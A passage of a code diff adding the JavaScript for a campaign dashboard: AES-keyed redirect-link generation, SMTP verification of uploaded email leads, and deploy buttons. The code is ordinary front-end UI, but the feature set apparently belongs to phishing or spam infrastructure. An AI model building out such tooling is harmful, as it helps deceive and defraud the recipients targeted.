+      if (errRedir) errRedir.textContent = 'Redirect URL is required.';
+      valid = false;
+    }
+    if (key && !key.value.trim()) {
+      if (errKey) errKey.textContent = 'AES key is required.';
+      valid = false;
+    } else if (key && key.value.trim().length < 32) {
+      if (errKey) {
+        errKey.textContent = 'Key is shorter than 32 characters. Make sure this is a base64-encoded 32-byte key.';
+        errKey.className = 'field-warning';
+      }
+    }
+    return valid;
+  }
+
+  // ═══ Generate Link (AJAX) ═══
+  var linkForm = document.getElementById('link-form');
+  if (linkForm) {
+    linkForm.querySelectorAll('input').forEach(function(inp){
+      inp.addEventListener('input', function(){
+        var errEl = document.getElementById('err-' + inp.id);
+        if (errEl) errEl.textContent = '';
+      });
+    });
+
+    linkForm.addEventListener('submit', function(e){
+      e.preventDefault();
+      if (!validateLinkForm(linkForm)) return;
+
+      var cid = linkForm.getAttribute('data-campaign');
+      var formData = new FormData(linkForm);
+      var btn = linkForm.querySelector('button[type="submit"]');
+      var resultDiv = document.getElementById('link-result');
+
+      setBtnLoading(btn, true);
+
+      fetch('/api/campaigns/' + cid + '/link', {
+        method: 'POST',
+        body: new URLSearchParams(formData)
+      })
+      .then(function(r){ return r.json(); })
+      .then(function(data){
+        if (data.link) {
+          resultDiv.classList.remove('hidden');
+          resultDiv.innerHTML =
+            '<div class="link-result-label">Generated Link</div>' +
+            '<div class="link-result-value" id="gen-link">' + escHtml(data.link) + '</div>' +
+            '<div class="link-result-actions">' +
+              '<button class="btn btn-sm btn-primary copy-btn" data-target="gen-link">Copy</button>' +
+            '</div>';
+          bindCopyBtn(resultDiv.querySelector('.copy-btn'));
+          showToast('Link generated successfully.', 'success');
+        } else if (data.error) {
+          resultDiv.classList.remove('hidden');
+          resultDiv.innerHTML = '<div style="color:var(--red);">Error: ' + escHtml(data.error) + '</div>';
+          showToast(data.error, 'error');
+        }
+      })
+      .catch(function(err){
+        resultDiv.classList.remove('hidden');
+        resultDiv.innerHTML = '<div style="color:var(--red);">Network error: ' + escHtml(err.message) + '</div>';
+        showToast('Network error: ' + err.message, 'error');
+      })
+      .finally(function(){
+        setBtnLoading(btn, false);
+      });
+    });
+  }
+
+  // ═══ Verify Leads (AJAX) ═══
+  var verifyForm = document.getElementById('verify-form');
+  if (verifyForm) {
+    verifyForm.addEventListener('submit', function(e){
+      e.preventDefault();
+      var cid = verifyForm.getAttribute('data-campaign');
+      var formData = new FormData(verifyForm);
+      var mode = e.submitter ? (e.submitter.value || 'count') : 'count';
+      var resultDiv = document.getElementById('verify-result');
+      var progressDiv = document.getElementById('upload-progress');
+      var progressText = document.getElementById('upload-progress-text');
+      var btns = verifyForm.querySelectorAll('button[type="submit"]');
+
+      btns.forEach(function(b){ b.disabled = true; });
+      if (progressDiv) {
+        progressDiv.classList.remove('hidden');
+        if (progressText) progressText.textContent = 'Uploading leads.csv...';
+      }
+
+      fetch('/api/campaigns/' + cid + '/verify?mode=' + mode, {
+        method: 'POST',
+        body: formData
+      })
+      .then(function(r){ return r.json(); })
+      .then(function(data){
+        resultDiv.classList.remove('hidden');
+        if (data.error) {
+          resultDiv.innerHTML = '<div style="color:var(--red);">Error: ' + escHtml(data.error) + '</div>';
+          showToast(data.error, 'error');
+          return;
+        }
+        if (data.mode === 'smtp') {
+          resultDiv.innerHTML =
+            '<div class="verify-stats">' +
+              '<div class="verify-stat"><div class="verify-stat-value">' + (data.total||0) + '</div><div class="verify-stat-label">Total</div></div>' +
+              '<div class="verify-stat"><div class="verify-stat-value text-green">' + (data.valid||0) + '</div><div class="verify-stat-label">Valid</div></div>' +
+              '<div class="verify-stat"><div class="verify-stat-value text-amber">' + (data.catch_all||0) + '</div><div class="verify-stat-label">Catch-All</div></div>' +
+              '<div class="verify-stat"><div class="verify-stat-value" style="color:var(--red);">' + (data.invalid||0) + '</div><div class="verify-stat-label">Invalid</div></div>' +
+            '</div>';
+        } else {
+          resultDiv.innerHTML =
+            '<div class="verify-stats">' +
+              '<div class="verify-stat"><div class="verify-stat-value text-green">' + (data.count||0) + '</div><div class="verify-stat-label">Leads Found</div></div>' +
+              '<div class="verify-stat"><div class="verify-stat-value" style="font-size:13px;font-family:var(--font-mono);">' + escHtml(data.file||'') + '</div><div class="verify-stat-label">File</div></div>' +
+            '</div>';
+        }
+        showToast('Verification complete: ' + (data.count||data.total||0) + ' leads processed.', 'success');
+      })
+      .catch(function(err){
+        resultDiv.classList.remove('hidden');
+        resultDiv.innerHTML = '<div style="color:var(--red);">Network error: ' + escHtml(err.message) + '</div>';
+        showToast('Network error: ' + err.message, 'error');
+      })
+      .finally(function(){
+        if (progressDiv) progressDiv.classList.add('hidden');
+        btns.forEach(function(b){ b.disabled = false; });
+      });
+    });
+  }
+
+  // ═══ Deploy button loading ═══
+  var deployForms = document.querySelectorAll('form[action*="/deploy"]');
+  deployForms.forEach(function(f){
+    f.addEventListener('submit', function(){
+      var btn = f.querySelector('button[type="submit"]');
+      if (btn) setBtnLoading(btn, true);
+    });
+  });
+
+})();
+</script>
+</body>
+</html>
